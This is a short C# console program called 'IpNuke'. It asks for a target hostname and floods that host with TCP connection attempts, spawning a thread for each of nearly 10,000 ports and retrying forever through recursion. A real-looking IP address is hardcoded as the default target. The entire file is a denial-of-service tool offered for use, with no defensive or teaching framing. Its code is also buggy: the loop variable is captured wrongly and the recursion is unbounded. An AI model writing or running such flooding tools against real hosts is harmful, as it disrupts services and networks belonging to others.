using System;
using System.Threading;
using System.Net.Sockets;

namespace IpNuke
{
    class Program
    {

        static string targethost = ("80.30.199.231");

        static void Main(string[] args)
        {
            PrintInColor("Enter target hostname (please write a valid hostname)", ConsoleColor.Yellow);
            targethost = Console.ReadLine();
            PrintInColor("Started ip nuke on " + targethost, ConsoleColor.Green);
            NukeIp();
        }
        static public void NukeIp()
        {
            for (int i = 1; i < 9999; i++)
            {
                Thread t = new Thread(() => ConnectTcp(targethost, i));
                t.Start();
            }
        }
        static public void ConnectTcp(string ip, int port)
        {
            TcpClient client = null;

            try
            {
                client = new TcpClient();
                client.Connect(ip, port);
            }
            catch (Exception e)
            {
                
            }
            finally
            {
                ConnectTcp(ip, port);
            }
        }
        static public void PrintInColor(string str, ConsoleColor color, bool setwhiteafterprinted = true)
        {
            Console.ForegroundColor = color;
            Console.WriteLine(str);
            if (setwhiteafterprinted)
                Console.ForegroundColor = ConsoleColor.White;
        }
    }
}
